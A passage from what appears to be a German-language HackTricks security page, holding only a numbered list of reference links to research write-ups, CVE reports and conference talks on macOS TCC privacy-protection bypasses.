- [2] [macOS-TCC-Benutzer-Datenschutz durch Zufall und Design umgehen](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Umgehung der TCC Location Services (Originalbericht)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Wo auf der Welt ist Carmen Sandiego: Location Services unter macOS missbrauchen](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC-bypass stiehlt Daten aus iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG-Umgebungsvariablen)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow-DYLD-environment-variables-Entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarisierung: die Hardened Runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day-TCC-bypass in der XCSSET-Malware entdeckt](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „Was auf deinem Mac passiert, bleibt in Apples iCloud?!“ - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Neue macOS-Schwachstelle „powerdir“ könnte zu unbefugtem Zugriff auf Benutzerdaten führen](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home-Verzeichnis ändern und TCC umgehen, auch bekannt als CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Musik abspielen und TCC umgehen, auch bekannt als CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Wie man einen (Fire)fox ausraubt](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - TCC mit Telegram unter macOS umgehen](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Aufdecken von Apple-Schwachstellen: Audit von diskarbitrationd und storagekitd, Teil 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Umgebungsvariablen unter OS X setzen](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs-TCC-bypass und Privilege Escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC-bypass durch Mounten über der TCC-Datenbank](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ Möglichkeiten, deine macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout-Sieg gegen TCC - 20+ NEUE Möglichkeiten, deine macOS-Datenschutzmechanismen zu umgehen](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
